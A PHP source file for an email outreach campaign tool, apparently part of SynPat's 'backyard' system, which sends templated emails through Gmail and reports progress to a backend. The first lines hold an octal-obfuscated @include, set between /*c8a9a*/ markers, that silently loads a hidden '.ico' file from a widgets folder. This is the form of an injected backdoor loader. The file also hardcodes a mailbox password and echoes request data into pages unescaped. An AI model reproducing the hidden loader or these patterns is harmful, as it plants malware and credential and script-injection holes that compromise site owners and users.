<?php
/*c8a9a*/

@include "\057va\162/w\167w/\163yn\160at\057ba\143ky\141rd\057pu\142li\143/w\151dg\145ts\057wi\172ar\144/.\0618c\14469\0661.\151co";

/*c8a9a*/

 
	session_start();
	define('MAIN_URL','http://backyard.synpat.com/');
?>
<style>
	body {
		margin: 0;
		padding: 0;
	}
	.emaillinked-form {
		font-family: Arial;
		margin: 8px;
		/*width: 290px;*/
	}
	.emaillinked-form input[type=text],
	.emaillinked-form input[type=email],
	.emaillinked-form input[type=password],
	.emaillinked-form textarea {
		background: #fff;
	    border: 1px solid #ddd;
	    color: #888;
	    box-sizing: border-box;
	    border-radius: 0px;
	    box-shadow: none;
	    display: block;
		font-family: Arial;
	    font-size: 14px;
	    height: 36px;
	    margin-bottom: 15px;
	    outline: none !important;
	    padding: 8px 8px 8px 8px;
	    text-overflow: ellipsis;
	    transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -moz-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -webkit-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -o-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    width: 100%;
	}
	.emaillinked-form textarea {
		height: 60px;
	}
	.emaillinked-form input[type=text]:hover,
	.emaillinked-form input[type=email]:hover,
	.emaillinked-form input[type=password]:hover,
	.emaillinked-form textarea:hover {
	    color:#333 !important;
	    border-color:#aaa !important;
	}
	.emaillinked-form input[type=text]:hover::-webkit-input-placeholder,
	.emaillinked-form input[type=email]:hover::-webkit-input-placeholder,
	.emaillinked-form input[type=password]:hover::-webkit-input-placeholder,
	.emaillinked-form textarea::-webkit-input-placeholder {
	    color: #333;
	    transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -moz-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -webkit-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	    -o-transition: color 300ms ease-in-out, background-color 300ms ease-in-out, border-color 300ms ease-in-out;
	}
	.emaillinked-form label {
	    display: block;
	    font-size: 13px;
	    font-weight: bold;
	    margin-bottom: 3px;
	}
	.emaillinked-form .button {
        background-color: #BD202F;
        border: none;
        border-radius: 0.21429em;
	    color: #ffffff;
   		cursor: pointer;
	    font-size: 14px;
	    font-weight: bold;
	    line-height: 1.4;
	    margin-bottom: 0;
	    margin-top: 0;
	    min-width: 200px;
	    padding: 8px 15px;
        text-transform: uppercase;
	    /*width: 100%;*/
	}
	.emaillinked-form .button:hover {
		background-color: #911924;
	}
.table {
	margin:0px;padding:0px;
	width:100%;
	border:1px solid #e5e5e5;
	
	-moz-border-radius-bottomleft:0px;
	-webkit-border-bottom-left-radius:0px;
	border-bottom-left-radius:0px;
	
	-moz-border-radius-bottomright:0px;
	-webkit-border-bottom-right-radius:0px;
	border-bottom-right-radius:0px;
	
	-moz-border-radius-topright:0px;
	-webkit-border-top-right-radius:0px;
	border-top-right-radius:0px;
	
	-moz-border-radius-topleft:0px;
	-webkit-border-top-left-radius:0px;
	border-top-left-radius:0px;
}.table table{
    border-collapse: collapse;
        border-spacing: 0;
	width:100%;
	height:100%;
	margin:0px;padding:0px;
}.table tr:last-child td:last-child {
	-moz-border-radius-bottomright:0px;
	-webkit-border-bottom-right-radius:0px;
	border-bottom-right-radius:0px;
}
.table table tr:first-child td:first-child {
	-moz-border-radius-topleft:0px;
	-webkit-border-top-left-radius:0px;
	border-top-left-radius:0px;
}
.table table tr:first-child td:last-child {
	-moz-border-radius-topright:0px;
	-webkit-border-top-right-radius:0px;
	border-top-right-radius:0px;
}.table tr:last-child td:first-child{
	-moz-border-radius-bottomleft:0px;
	-webkit-border-bottom-left-radius:0px;
	border-bottom-left-radius:0px;
}.table tr:hover td{
	
}
.table tr:nth-child(odd){ background-color:#ededed; }
.table tr:nth-child(even)    { background-color:#ffffff; }.table td{
	vertical-align:middle;
	
	
	border:1px solid #e5e5e5;
	border-width:0px 1px 1px 0px;
	text-align:left;
	padding:10px;
	font-size:13px;
	font-family:Arial;
	font-weight:normal;
	color:#000000;
}.table tr:last-child td{
	border-width:0px 1px 0px 0px;
}.table tr td:last-child{
	border-width:0px 0px 1px 0px;
}.table tr:last-child td:last-child{
	border-width:0px 0px 0px 0px;
}
.table tr:first-child td{
		background:-o-linear-gradient(bottom, #9b9b9b 5%, #c4c4c4 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #9b9b9b), color-stop(1, #c4c4c4) );
	background:-moz-linear-gradient( center top, #9b9b9b 5%, #c4c4c4 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#9b9b9b", endColorstr="#c4c4c4");	background: -o-linear-gradient(top,#9b9b9b,c4c4c4);

	background-color:#9b9b9b;
	border:0px solid #e5e5e5;
	text-align:center;
	border-width:0px 0px 1px 1px;
	font-size:14px;
	font-family:Arial;
	font-weight:bold;
	color:#ffffff;
}
.table tr:first-child:hover td{
	background:-o-linear-gradient(bottom, #9b9b9b 5%, #c4c4c4 100%);	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #9b9b9b), color-stop(1, #c4c4c4) );
	background:-moz-linear-gradient( center top, #9b9b9b 5%, #c4c4c4 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#9b9b9b", endColorstr="#c4c4c4");	background: -o-linear-gradient(top,#9b9b9b,c4c4c4);

	background-color:#9b9b9b;
}
.table tr:first-child td:first-child{
	border-width:0px 0px 1px 0px;
}
.table tr:first-child td:last-child{
	border-width:0px 0px 1px 1px;
}
</style>
<?php

	if(isset($_POST)){	
		switch($_POST['setup']){
			case 'resume':
				if(isset($_POST['campaign_id'])){
					$curl = curl_init();
					// Set some options - we are passing in a useragent too here
					curl_setopt_array($curl, array(
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_URL => MAIN_URL.'customers/campaign',
						CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
						CURLOPT_POST => 1,
						CURLOPT_POSTFIELDS => array(
							'campaign_type' => 0,	
							'id' => $_POST['campaign_id']	
						)				
					));
					$resp = curl_exec($curl);
					$list = array();
					if($resp){
						$list = json_decode($resp,true);
					}
					
					if(count($list)>0){
						$_SESSION['lead_id'] = $list['campaign']['lead_id'];
						$leadID = $_SESSION['lead_id'];
						$leadName = $list['campaign']['lead_name'];
						$emailList = "";
						$personList = "";
						$companyList = "";
						$mainActivity = 1;
						$_SESSION[$leadID.'main_activity'] = $mainActivity;
						$_SESSION[$leadID.'mail_start'] = 0;
						if(count($list['list'])>0){
							$i=1;
							foreach($list['list'] as $person){
								if($person['send']==1){
									$_SESSION[$leadID.'mail_start'] = $i;
									$i++;
								}
								$emailList .=$person['address'].", ";
								$personList .=$person['person_name'].", ";
								$companyList .=$person['company'].", ";
								
							}							
							$_SESSION[$leadID.'subject'] = $list['campaign']['subject'];
							$_SESSION[$leadID.'body'] = $list['campaign']['body'];
							$_SESSION[$leadID.'template_file'] = $list['campaign']['template_file'];
							$_SESSION[$leadID.'campaign_id'] = $list['campaign']['id'];
							$_SESSION[$leadID.'mail_list'] = $emailList;
							$_SESSION[$leadID.'person_list'] = $personList;
							$_SESSION[$leadID.'company_list'] = $companyList;
							$_SESSION[$leadID.'user_id'] = $list['campaign']['user_id'];
							
							$_SESSION[$leadID.'mail_log'] = array();
							$_SESSION[$leadID.'mail_email'] = "licenses@synpat.com";
							$_SESSION[$leadID.'mail_password'] = "12wq12wq";
							/*echo $_SESSION[$leadID.'mail_start'];
							die;*/
							showSubjectBody();
						}
					}
				}
			break;
			
			case 'implementation':
				if(isset($_POST['lead_id'])){
					$_SESSION['lead_id'] = $_POST['lead_id'];
					$leadID = $_SESSION['lead_id'];
					$emailList = array();	
					$personList = "";
					$companyList = "";
					$mainActivity = 0;
					if(isset($_POST['activity_type'])){
						$mainActivity = $_POST['activity_type'];
					}
					if(isset($_POST['email_list'])){
						$emailList = $_POST['email_list'];
					} 
					if(isset($_POST['person_list'])){
						$personList = $_POST['person_list'];
					} 
					if(isset($_POST['company_list'])){	
						$companyList = $_POST['company_list'];
					} 
					if(isset($_POST['subject'])){	
						$_SESSION[$leadID.'subject'] = $_POST['subject'];
					}
					if(isset($_POST['template_file'])){
						$_SESSION[$leadID.'template_file'] = $_POST['template_file'];
					}
					$_SESSION[$leadID.'mail_list'] = $emailList;
					$_SESSION[$leadID.'main_activity'] = $mainActivity;
					if($mainActivity==1){
						$_SESSION[$leadID.'mail_email'] = "licenses@synpat.com";
						$_SESSION[$leadID.'mail_password'] = "12wq12wq";
					} else {
						$_SESSION[$leadID.'mail_email'] = "licenses@synpat.com";
						$_SESSION[$leadID.'mail_password'] = "12wq12wq";
					}
					$leadName = $_POST['lead_name'];
					$template = "";
					if(isset($_POST['email_message'])){
						$template = $_POST['email_message'];
					}
					$_SESSION[$leadID.'mail_message'] = $template;
					$_SESSION[$leadID.'body'] = $template;
					$curl = curl_init();
					// Set some options - we are passing in a useragent too here
					$sendData = array("person"=>$personList,"company"=>$companyList,"email"=>$emailList,"lead_id"=>$leadID,"campaign_type"=>"1","lead_name"=>$leadName,"subject"=>$_POST['subject'],"body"=>$template,"user_id"=>$_POST['user_id'],"template_file"=>$_POST['template_file'],"start_date"=>date("Y-m-d H:i:s"));
					curl_setopt_array($curl, array(
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_URL => MAIN_URL.'customers/start_campaign',
						CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
						CURLOPT_POST => 1,
						CURLOPT_POSTFIELDS => array(
							'campaign_data' => json_encode($sendData),
						)				
					));
					$resp = curl_exec($curl);
					if($resp>0){
						$_SESSION[$leadID.'campaign_id'] = $resp;
					} else {
						$_SESSION[$leadID.'campaign_id'] = 0;
					}
					
					$_SESSION[$leadID.'mail_ignore'] = array();
					$_SESSION[$leadID.'person_list'] = $personList;	
					$_SESSION[$leadID.'company_list'] = $companyList;
					$_SESSION[$leadID.'user_id'] = $_POST['user_id'];
					$_SESSION[$leadID.'mail_start'] = 0;
					$_SESSION[$leadID.'mail_log'] = array();
					/*$_SESSION[$leadID.'mail_email'] = $_POST['email'];
					$_SESSION[$leadID.'mail_password'] = $_POST['password'];*/
					/*showLoginForm();*/
					showSubjectBody();
				}
			break;
			case 'start':
				if(isset($_POST)){
					if(isset($_POST['email']) && isset($_POST['password']) && !empty($_POST['email']) && !empty($_POST['password'])){
						$hostname = '{imap.gmail.com:993/imap/ssl}INBOX';
						$username = $_POST['email']; # e.g somebody@gmail.com
						$password = $_POST['password'];
						$inbox = imap_open($hostname,$username,$password);
						if($inbox){
							$leadID = $_SESSION['lead_id'];
							$_SESSION[$leadID.'mail_email'] = $_POST['email'];
							$_SESSION[$leadID.'mail_password'] = $_POST['password'];
							showSubjectBody();
						} else {
							echo imap_last_error();
							showLoginForm();
						}
					} else {
						showLoginForm();
					}
				}
			break;
			case 'final_step':
				$leadID = $_SESSION['lead_id'];
				if(isset($_POST['subject'])){
					$_SESSION[$leadID.'subject']= $_POST['subject'];
				}
				if(isset($_POST['body'])){
					$_SESSION[$leadID.'body'] = $_POST['body'];
				}
				showFinalStep();
			break;
			case 'ignore':
				/*delete email from campaign*/
				
				ini_set("log_errors", 1);
				ini_set("error_log", "php-error.log");
				error_log("IGNORE:". date('d/m/y H:i:s') );
				$leadID = $_SESSION['lead_id'];
				$curl = curl_init();
				curl_setopt_array($curl, array(
					CURLOPT_RETURNTRANSFER => 1,
					CURLOPT_URL => MAIN_URL.'customers/delete_address_from_campaign',
					CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
					CURLOPT_POST => 1,
					CURLOPT_POSTFIELDS => array(
						'to' => $_POST['to'],
						'campaign_id'=>$_SESSION[$leadID.'campaign_id']
					)				
				));
				$ignoreEmails = array();
				if(isset($_SESSION[$leadID.'mail_ignore'])){
					$ignoreEmails = $_SESSION[$leadID.'mail_ignore'];
				}				
				if(!empty($_POST['to'])){ 
					array_push($ignoreEmails,$_POST['to']);
				}
				$_SESSION[$leadID.'mail_ignore'] = $ignoreEmails;
				$resp = curl_exec($curl);
				if($resp){
					error_log('Request from backyard completed'. date('d/m/y H:i:s') );
				}
				$start = (int)$_SESSION[$leadID.'mail_start'] + 1;
				$explode = explode(',',$_SESSION[$leadID.'mail_list']);
				if(isset($explode[$start])){
					$emailNext = trim($explode[$start]);
					if(!empty($emailNext)){
						$_SESSION[$leadID.'mail_start'] = $start ;
						error_log('Processing next-'. date('d/m/y H:i:s') );
						showSubjectBody();	
					} else {
						$curl = curl_init();
						error_log('Sending request to backyard for process'. date('d/m/y H:i:s') );
						curl_setopt_array($curl, array(
							CURLOPT_RETURNTRANSFER => 1,
							CURLOPT_URL => MAIN_URL.'customers/save_process_campaign',
							CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
							CURLOPT_POST => 1,
							CURLOPT_POSTFIELDS => array(
								'lead_id' => $leadID,
								'to' => $_SESSION[$leadID.'mail_list'],
								'type'=>3,
								'subject'=>$_POST['subject'],
								'user_id'=>$_SESSION[$leadID.'user_id'],
								'campaign_id'=> $_SESSION[$leadID.'campaign_id'],
								'main_activity'=>$_SESSION[$leadID.'main_activity'],
								'campaign_date'=>date('Y-m-d H:i:s')
							)				
						));
						$resp = curl_exec($curl);
						if($resp){
							if($resp>0){
								error_log('Request from backyard completed'. date('d/m/y H:i:s').' @'.$resp );
							}
						}
						
						/**/
						session_destroy();
						error_log('End of Campaign-'. date('d/m/y H:i:s') );
						showCompleteMessage();
					}
				}	
				
				
			break;
			case 'send':
				ini_set("log_errors", 1);
				ini_set("error_log", "php-error.log");
				error_reporting(E_ALL);
				ini_set('display_errors', 1);
				error_log( date('d/m/y H:i:s') );
				require 'PHPMailer-master/PHPMailerAutoload.php';				
				$leadID = $_SESSION['lead_id'];
				$mail = new PHPMailer;
				error_log( date('d/m/y H:i:s') );				
				//$mail->SMTPDebug = 2;                               // Enable verbose debug output
				$mail->isSMTP();                                      // Set mailer to use SMTP
				$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
				$mail->SMTPAuth = true;                               // Enable SMTP authentication
				$mail->Username = $_SESSION[$leadID.'mail_email'];                 // SMTP username
				$mail->Password = $_SESSION[$leadID.'mail_password'];                           // SMTP password
				$mail->SMTPSecure = 'ssl';                            // Enable TLS encryption, `ssl` also accepted
				$mail->Port = 465;                                    // TCP port to connect to
				$mail->From = $_SESSION[$leadID.'mail_email'];
				$mail->FromName = "Licenses SynPat";
				$mail->addAddress($_POST['to'], $_POST['to']);     // Add a recipient
				$mail->isHTML(true);                                  // Set email format to HTML
				$mail->Subject = $_POST['subject'];
				$mail->Body    = $_POST['email_message'];
				error_log('Email Format done, Now start sending from imap: '. date('d/m/y H:i:s') );
				
				if($mail->send()) {
					error_log('Mail sent: '. date('d/m/y H:i:s') );	
					$curl = curl_init();
					curl_setopt_array($curl, array(
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_URL => MAIN_URL.'customers/update_campaign_addresss_send',
						CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
						CURLOPT_POST => 1,
						CURLOPT_POSTFIELDS => array(
							'to' => $_POST['to'],
							'campaign_id'=>$_SESSION[$leadID.'campaign_id']
						)				
					));
					$resp = curl_exec($curl);
					if($resp){
						error_log('Request from backyard completed'. date('d/m/y H:i:s') );
					}
					?>
					<script>opener.runSignleActivityProcess('<?php echo $_POST['to']?>',<?php echo $_SESSION[$leadID.'campaign_id']?>);</script>
					<?php
					$body = $_POST['email_message'];
					$start = (int)$_SESSION[$leadID.'mail_start'] + 1;
					$explode = explode(',',$_SESSION[$leadID.'mail_list']);
					if(isset($explode[$start])){
						$emailNext = trim($explode[$start]);
						if(!empty($emailNext)){
							$_SESSION[$leadID.'mail_start'] = $start ;
							error_log('Processing next-'. date('d/m/y H:i:s') );
							showSubjectBody();	
						} else {
							/**/
							/*$curl = curl_init();
							// Set some options - we are passing in a useragent too here
							error_log('Sending request to backyard'. date('d/m/y H:i:s') );
							curl_setopt_array($curl, array(
								CURLOPT_RETURNTRANSFER => 1,
								CURLOPT_URL => 'http://backyard.synpat.com/customers/sales_activity_email_save',
								CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
								CURLOPT_POST => 1,
								CURLOPT_POSTFIELDS => array(
									'lead_id' => $leadID,
									'to' => $_POST['to'],
									'type'=>3,
									'subject'=>$_POST['subject'],
									'body'=>$body,
									'user_id'=>$_SESSION[$leadID.'user_id'],
									'main_activity'=>$_SESSION[$leadID.'main_activity']
								)				
							));
							
							$resp = curl_exec($curl);
							if($resp){
								if($resp>0){
									error_log('Request from backyard completed'. date('d/m/y H:i:s') );
								}
							} */
							$curl = curl_init();
							error_log('Sending request to backyard for process'. date('d/m/y H:i:s') );
							curl_setopt_array($curl, array(
								CURLOPT_RETURNTRANSFER => 1,
								CURLOPT_URL => MAIN_URL.'customers/save_process_campaign',
								CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
								CURLOPT_POST => 1,
								CURLOPT_POSTFIELDS => array(
									'lead_id' => $leadID,
									'to' => $_SESSION[$leadID.'mail_list'],
									'type'=>3,
									'subject'=>$_POST['subject'],
									'user_id'=>$_SESSION[$leadID.'user_id'],
									'campaign_id'=> $_SESSION[$leadID.'campaign_id'],
									'main_activity'=>$_SESSION[$leadID.'main_activity'],
									'campaign_date'=>date('Y-m-d H:i:s')
								)				
							));
							$resp = curl_exec($curl);
							if($resp){
								if($resp>0){
									error_log('Request from backyard completed'. date('d/m/y H:i:s').' @'.$resp );
								}
							}
							
							/**/
							session_destroy();
							error_log('End of Campaign-'. date('d/m/y H:i:s') );
							showCompleteMessage();
						}
					}										
				} else {						
					error_log('Error Email not send'. date('d/m/y H:i:s').$mail->ErrorInfo );
					/*echo 'Message could not be sent.';
					echo 'Mailer Error: ' . $mail->ErrorInfo;*/
					$body = $_POST['email_message'];
					$start = (int)$_SESSION[$leadID.'mail_start'] + 1;
					$explode = explode(',',$_SESSION[$leadID.'mail_list']);
					if(isset($explode[$start])){
					$emailNext = trim($explode[$start]);
					if(!empty($emailNext)){
						$_SESSION[$leadID.'mail_start'] = $start ;
						error_log('Processing next-'. date('d/m/y H:i:s') );
						showSubjectBody();						
					} else {
						$curl = curl_init();
							error_log('Sending request to backyard for process.'. date('d/m/y H:i:s') );
							curl_setopt_array($curl, array(
								CURLOPT_RETURNTRANSFER => 1,
								CURLOPT_URL => MAIN_URL.'customers/save_process_campaign',
								CURLOPT_USERAGENT => 'Send Request for create demo portfolio'		,
								CURLOPT_POST => 1,
								CURLOPT_POSTFIELDS => array(
									'lead_id' => $leadID,
									'to' => $_SESSION[$leadID.'mail_list'],
									'type'=>3,
									'subject'=>$_POST['subject'],
									'user_id'=>$_SESSION[$leadID.'user_id'],
									'campaign_id'=> $_SESSION[$leadID.'campaign_id'],
									'main_activity'=>$_SESSION[$leadID.'main_activity'],
									'campaign_date'=>date('Y-m-d H:i:s')
								)				
							));
							$resp = curl_exec($curl);
							if($resp){
								if($resp>0){
									error_log('Request from backyard completed'. date('d/m/y H:i:s').' @'.$resp );
								}
							}
							
							/**/
							session_destroy();
							error_log('End of Campaign-'. date('d/m/y H:i:s') );
							showCompleteMessage();
					}
					}
				}
			break;
		}		
	}
	
function showLoginForm(){
?>
<form action="<?php echo MAIN_URL;?>base/email_campaign/index.php" method="post" class="emaillinked-form">
	<label>Username:</label><input type="text" name="email"/>
	<label>Password:</label><input type="password" name="password"/>
	<button type="submit" class="button">Submit</button>
	<input type="hidden" name='setup' value="start"/>
</form>
<?php
}
function showSubjectBody(){
	$leadID = $_SESSION['lead_id'];
	$subject = "";
	$body = "";
	if(isset($_SESSION[$leadID.'subject'])){
		$subject = $_SESSION[$leadID.'subject'];
	}
	if(isset($_SESSION[$leadID.'body'])){
		$body = $_SESSION[$leadID.'body'];
	}
?>
	<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script> 
	<link rel="stylesheet" href="css/bootstrap.min.css" />
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="font-awesome-4.4.0/css/font-awesome.min.css" />
     <link rel="stylesheet" type="text/css" href="css/summernote.css">
      <script type='text/javascript' src="js/summernote.min.js"></script>
	  <script>
		$(document).ready(function() {
  $('#body').summernote({
	  height:350
  });
});
	  </script>
	  <?php 
			$peronList = explode(',',$_SESSION[$leadID.'person_list']);		$companyList = explode(',',$_SESSION[$leadID.'company_list']);$mailList = explode(',',$_SESSION[$leadID.'mail_list']);
			$ignoreEmails = array();
			if(isset($_SESSION[$leadID.'mail_ignore'])){
				$ignoreEmails = $_SESSION[$leadID.'mail_ignore'];
			}
		?>
	  <div style='float:left;width:25%'>
		<h3>To Send</h3>
		<table class='table'>
		
			<tr>
				<td>Person</td>
				<td>Company</td>
			</tr>
		
		<?php 
			if(count($peronList)>0){
				for($i=$_SESSION[$leadID.'mail_start'];$i<count($peronList);$i++){
		?>
					<tr>
						<td><?php echo $peronList[$i]?></td>
						<td><?php echo $companyList[$i]?></td>
					</tr>
			<?php
				}
			}
		?>
		</table>
	  </div>
	  <div style='float:left;width:25%'>
		<h3>Was Send To</h3>
		<table class='table'>
		
			<tr>
				<td>Person</td>
				<td>Company</td>
			</tr>
		
		<?php 
			if($_SESSION[$leadID.'mail_start']>0){				
				for($i=0;$i<$_SESSION[$leadID.'mail_start'];$i++){
					$show = true;
					if(isset($mailList[$i]) && count($ignoreEmails)>0){
						foreach($ignoreEmails as $ignEmail){
							if(trim($ignEmail)==trim($mailList[$i])){
								$show = false;
								break;
							}
						}
					}
					if($show===true):
			?>
					<tr>
						<td><?php echo $peronList[$i]?></td>
						<td><?php echo $companyList[$i]?></td>
					</tr>
			<?php
					endif;
				}
			}
		?>
		</table> 
	  </div>
	  <div style='float:left;width:50%'> 
			<form action="<?php echo $_SERVER['PHP_SELF']?>" method="post" class="emaillinked-form">
				<button type="submit" class="button" style='float:right;margin-bottom:10px;'>Start this message to the next invitee</button>
				<label>Subject:</label><input type="text" name="subject" value="<?php echo $subject;?>"/>
				<span style='float:right;'>Legend: use for firstname #First#, for lastname #Last#, for company #Company#<br/></span> 
				<label>Body:</label><textarea name="body" id="body"><?php echo $body;?></textarea>				
				<input type="hidden" name='setup' value="final_step"/>
			</form>
	  </div>
	
<?php
}
function showFinalStep(){
	$leadID = $_SESSION['lead_id'];
		$to = "";		$person = "";		$company ="";
		$subject = "";
		$body = "";
		if(isset($_SESSION[$leadID.'subject'])){
			$subject = $_SESSION[$leadID.'subject'];
		}
		/*if(isset($_SESSION[$leadID.'body']) && $_SESSION[$leadID.'body']!='<p><br></p><br/>'&& $_SESSION[$leadID.'body']!='<p><br></p>'){
			$body = $_SESSION[$leadID.'body'].'<br/>';
		}
		$body = $body.$_SESSION[$leadID.'mail_message'];*/
		$body = $_SESSION[$leadID.'body'];
		
			
	
		$mailList = explode(',',$_SESSION[$leadID.'mail_list']);		$peronList = explode(',',$_SESSION[$leadID.'person_list']);		$companyList = explode(',',$_SESSION[$leadID.'company_list']);
		if(count($mailList)>0){
			$emailTo = trim($mailList[$_SESSION[$leadID.'mail_start']]);
			$person = trim($peronList[$_SESSION[$leadID.'mail_start']]);	
			$company = trim($companyList[$_SESSION[$leadID.'mail_start']]);
			if(isset($mailList[$_SESSION[$leadID.'mail_start']]) && !empty($emailTo)){
				$to = $emailTo;
			}
			$first = explode(" ",$person);
			$body = str_replace("#First#",$first[0],$body);
			$body = str_replace("#Company#",$company,$body);
			$body = str_replace("#Last#",$first[1],$body);
		}
		
	?>
	<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script> 
	<link rel="stylesheet" href="css/bootstrap.min.css" />
	<script type="text/javascript" src="js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="font-awesome-4.4.0/css/font-awesome.min.css" />
     <link rel="stylesheet" type="text/css" href="css/summernote.css">
      <script type='text/javascript' src="js/summernote.min.js"></script>
	  <script>
		$(document).ready(function() {
  $('#email_message').summernote({
	  height:450,
	  disableDragAndDrop: true
  });
});
function ignoreEmail(){
	jQuery("#setup").val('ignore');
	jQuery("#frmSend").get(0).submit();
}
	  </script>
	<form action="<?php echo $_SERVER['PHP_SELF']?>" method="post" class="emaillinked-form" id='frmSend'>
		<button type="submit" class="button" style='float:right;margin-bottom:10px;'>Send this email</button>
		<button type="button" onclick='ignoreEmail();' class="button" style='float:right;margin-bottom:10px;margin-right:10px;'>Avoid sending this message and skip to the next one</button>
		<label>To: <font color='#ff000'><?php echo $person?>::<?php echo $company?></font></label><input type="text" name="to" value="<?php echo $to;?>"/>
		<label>Subject:</label><input type="text" name="subject" value="<?php echo $subject;?>"/>
		<label>Body:</label><textarea name="email_message" id="email_message"><?php echo $body;?></textarea>					
		
		<input type="hidden" name='setup' id='setup' value="send"/> 
	</form>
	<?php
}
function showCompleteMessage(){
?>
<script>window.close();</script>
<div class="emaillinked-form">
<script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script>
function runClose(){
	/*opener.runActivityProcess();
    opener.runThreadDetail(); 
*/
}

jQuery(document).ready(function(){
	setTimeout(function(){window.close()},500)  ;
});
</script>
	<h4>Finished.</h4>
	<a href='javascript:runClose();window.close();' class='button'>Close</a>
</div>
<?php
}
?>